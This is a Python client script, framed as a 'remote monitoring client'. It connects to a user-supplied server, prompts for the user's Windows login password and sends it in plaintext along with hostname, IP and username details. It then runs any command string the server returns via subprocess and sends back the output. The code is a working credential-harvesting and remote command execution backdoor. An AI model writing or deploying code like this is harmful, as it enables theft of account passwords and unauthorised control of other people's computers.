"""
Client Module - Updated for Public Server Connection
"""

import socket
import platform
import getpass
import subprocess
import sys
import os

def get_exact_username():
    """Get exact Windows username format"""
    try:
        result = subprocess.getoutput('whoami').strip()
        return result
    except:
        return getpass.getuser()

def get_system_info():
    """Gather system information"""
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        exact_user = get_exact_username()
        
        info = f"""
╔══════════════════════════════════════════════════════════╗
║                    SYSTEM INFORMATION                     ║
╠══════════════════════════════════════════════════════════╣
║ IP Address:     {ip:<45} ║
║ Hostname:       {hostname:<45} ║
║ OS:             {platform.system()} {platform.release():<30} ║
║ Architecture:   {platform.machine():<45} ║
║ Windows User:   {exact_user:<45} ║
║ Python Version: {platform.python_version():<45} ║
╚══════════════════════════════════════════════════════════╝
"""
        return info
    except Exception as e:
        return f"Error getting system info: {e}"

def run_client():
    """Main client function"""
    # Change this to your Railway app URL
    # Format: your-app-name.railway.app
    SERVER_HOST = input("Enter server IP or domain: ").strip()
    if not SERVER_HOST:
        SERVER_HOST = "127.0.0.1"
    
    PORT = 5000
    
    try:
        # Create socket
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((SERVER_HOST, PORT))
        
        # Display banner
        print("\n" + "="*60)
        print("  REMOTE MONITORING CLIENT")
        print("="*60)
        
        # Get exact username
        exact_username = get_exact_username()
        display_username = exact_username.split('\\')[-1] if '\\' in exact_username else exact_username
        
        print(f"\n[+] Windows Username: {exact_username}")
        print(f"[+] Use this username: '{display_username}'")
        print(f"[+] Password: Your Windows login password\n")
        
        # Get credentials
        print("=== LOGIN ===\n")
        username = input(f"Username [{display_username}]: ").strip()
        
        # If user pressed enter without typing, use the detected username
        if not username:
            username = display_username
            print(f"[+] Using detected username: '{username}'")
        
        password = getpass.getpass("Password: ")
        
        # Send credentials
        login_data = f"{username},{password}"
        client.send(login_data.encode())
        
        # Get response
        response = client.recv(1024).decode()
        
        if response == "AUTH_SUCCESS":
            print("\n[✓] Login successful! Connected to server.\n")
            
            # Send system info
            system_info = get_system_info()
            client.send(system_info.encode())
            
            # Wait for command
            command = client.recv(1024).decode()
            
            if command == "INVALID_COMMAND":
                print("[-] Command rejected by server")
            else:
                # Execute command
                output = subprocess.getoutput(command)
                client.send(output.encode())
                
                print("\n" + "="*60)
                print(f"  COMMAND OUTPUT: {command}")
                print("="*60)
                print(output)
                print("="*60)
        
        else:
            print("\n[✗] Login failed!")
            print(f"\n[!] Please try with exact username: '{display_username}'")
            print("[!] Make sure you're using your Windows login password")
    
    except ConnectionRefusedError:
        print("\n[✗] Server is not running!")
        print("[!] Please make sure the server is running and try again.")
        input("\nPress Enter to exit...")
        sys.exit(1)
    except Exception as e:
        print(f"\n[✗] Error: {e}")
        input("\nPress Enter to exit...")
        sys.exit(1)
    finally:
        client.close()
        print("\n[+] Disconnected from server")
        input("\nPress Enter to exit...")

if __name__ == "__main__":
    run_client()